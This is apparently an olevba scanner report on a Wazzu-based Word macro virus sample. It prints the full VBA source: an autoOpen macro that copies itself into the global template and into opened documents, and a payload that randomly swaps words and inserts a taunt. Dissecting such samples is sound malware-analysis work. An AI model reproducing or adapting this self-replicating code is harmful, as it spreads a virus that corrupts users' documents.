olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-24adb99dc5e9207377b6edadb9262448764bbe7a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-24adb99dc5e9207377b6edadb9262448764bbe7a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-24adb99dc5e9207377b6edadb9262448764bbe7a - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim filemacro$
Dim globmacro$
Dim macrofile$
On Error GoTo -1: On Error GoTo errcaught

WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg

filemacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
globmacro$ = "Global:autoOpen"
macrofile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

If macrofile$ = "NORMAL.DOT" Then
    WordBasic.MacroCopy globmacro$, filemacro$
    WordBasic.FileSaveAs Format:=1
Else
    WordBasic.MacroCopy filemacro$, globmacro$
End If

payload

GoTo bye

errcaught:

bye:
On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub payload()
Dim i
Dim selword$
Dim supprimer
Dim debut
For i = 1 To 3
If Rnd() < 0.2 Then
rndword
WordBasic.SelectCurWord
selword$ = WordBasic.[Selection$]()
supprimer mot

rndword
WordBasic.Insert selword$ + " "
End If
Next

If Rnd() < 0.25 Then
rndword
WordBasic.Insert "T'es verolé, mon pote !!!!!"
debut Document
End If

End Sub
Private Sub rndword()
Dim wordnum
Dim debut
WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics dlg
wordnum = WordBasic.Int(Rnd() * WordBasic.Val(dlg.Words))
debut Document
WordBasic.WordRight wordnum

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

